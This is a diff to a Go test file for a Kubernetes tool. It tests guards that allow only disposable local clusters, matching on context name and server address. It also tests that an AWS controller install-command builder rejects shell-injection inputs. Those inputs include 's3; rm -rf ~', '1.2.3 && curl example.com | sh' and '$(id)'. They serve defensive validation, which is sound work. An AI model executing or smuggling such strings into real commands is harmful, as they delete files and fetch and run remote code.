@@ -13,17 +13,32 @@ import (
 	"k8s.io/client-go/kubernetes/fake"
 )
 
-func TestRequireDisposableContext(t *testing.T) {
-	for name, allowed := range map[string]bool{
-		"k3d-vela-demo": true,
-		"kind-kind":     true,
-		"":              false,
-		"orbstack":      false,
-		"arn:aws:eks:us-west-2:123456789012:cluster/prod": false,
-		"my-k3d-lookalike": false,
-	} {
-		if err := RequireDisposableContext(name); (err == nil) != allowed {
-			t.Errorf("context %q: allowed=%v, got error %v", name, allowed, err)
+func TestRequireDisposableCluster(t *testing.T) {
+	cases := []struct {
+		context, server string
+		allowed         bool
+	}{
+		{"k3d-vela-demo", "https://0.0.0.0:62520", true},
+		{"k3d-vela-demo", "https://host.docker.internal:62520", true},
+		{"k3d-vela-demo", "https://k3d-vela-demo-serverlb:6443", true},
+		{"kind-kind", "https://127.0.0.1:41235", true},
+		{"kind-kind", "https://[::1]:41235", true},
+		{"kind-ci", "https://ci-control-plane:6443", true},
+		{"kind-kind", "https://localhost:6443", true},
+		// The name is not proof: a real cluster behind a local-looking name is refused.
+		{"kind-prod", "https://ABCDEF.gr7.us-west-2.eks.amazonaws.com", false},
+		{"k3d-prod", "https://10.20.30.40:6443", false},
+		{"kind-kind", "https://other-control-plane:6443", false},
+		{"k3d-a", "https://k3d-b-serverlb:6443", false},
+		{"kind-kind", "", false},
+		{"", "https://127.0.0.1:6443", false},
+		{"orbstack", "https://127.0.0.1:26443", false},
+		{"arn:aws:eks:us-west-2:123456789012:cluster/prod", "https://127.0.0.1:6443", false},
+		{"my-k3d-lookalike", "https://127.0.0.1:6443", false},
+	}
+	for _, tc := range cases {
+		if err := RequireDisposableCluster(tc.context, tc.server); (err == nil) != tc.allowed {
+			t.Errorf("context %q at %q: allowed=%v, got error %v", tc.context, tc.server, tc.allowed, err)
 		}
 	}
 }
@@ -112,8 +127,11 @@ func TestRequireACKOnEmulator(t *testing.T) {
 	}
 }
 
-func TestACKInstallCommandPointsAtTheEmulator(t *testing.T) {
-	command := ACKInstallCommand("s3", "1.2.3")
+func TestACKInstallCommand(t *testing.T) {
+	command, err := ACKInstallCommand("s3", "1.2.3")
+	if err != nil {
+		t.Fatal(err)
+	}
 	for _, want := range []string{
 		"oci://public.ecr.aws/aws-controllers-k8s/s3-chart --version 1.2.3",
 		"aws.endpoint_url=" + AWSEmulatorEndpoint,
@@ -122,5 +140,40 @@ func TestACKInstallCommandPointsAtTheEmulator(t *testing.T) {
 		if !strings.Contains(command, want) {
 			t.Errorf("install command lacks %q:\n%s", want, command)
 		}
+	}
+
+	// Both arguments end up in a shell command.
+	for _, bad := range [][2]string{
+		{"s3; rm -rf ~", "1.2.3"},
+		{"s3", "1.2.3 && curl example.com | sh"},
+		{"S3", "1.2.3"},
+		{"", "1.2.3"},
+		{"s3", ""},
+		{"s3", "$(id)"},
+	} {
+		if _, err := ACKInstallCommand(bad[0], bad[1]); err == nil {
+			t.Errorf("service %q version %q: expected an error", bad[0], bad[1])
+		}
+	}
+}
+
+func TestRequireACKOnEmulatorRejectsABadServiceName(t *testing.T) {
+	err := (&Cluster{Kube: fake.NewClientset()}).RequireACKOnEmulator(context.Background(), "dynamodb; id")
+	if err == nil || !strings.Contains(err.Error(), "not an ACK service name") {
+		t.Errorf("got %v", err)
+	}
+}
+
+func TestEnsureAWSEmulatorUsesACompleteOne(t *testing.T) {
+	deployment := &appsv1.Deployment{
+		ObjectMeta: metav1.ObjectMeta{Name: AWSEmulatorName, Namespace: AWSEmulatorNamespace},
+		Status:     appsv1.DeploymentStatus{AvailableReplicas: 1},
+	}
+	service := &corev1.Service{ObjectMeta: metav1.ObjectMeta{Name: AWSEmulatorName, Namespace: AWSEmulatorNamespace}}
+	// No Dynamic client and no mapper: an apply would panic, so success means
+	// the running emulator was left alone.
+	cluster := &Cluster{Kube: fake.NewClientset(deployment, service)}
+	if err := cluster.EnsureAWSEmulator(context.Background(), "0.0.0"); err != nil {
+		t.Fatal(err)
 	}
 }
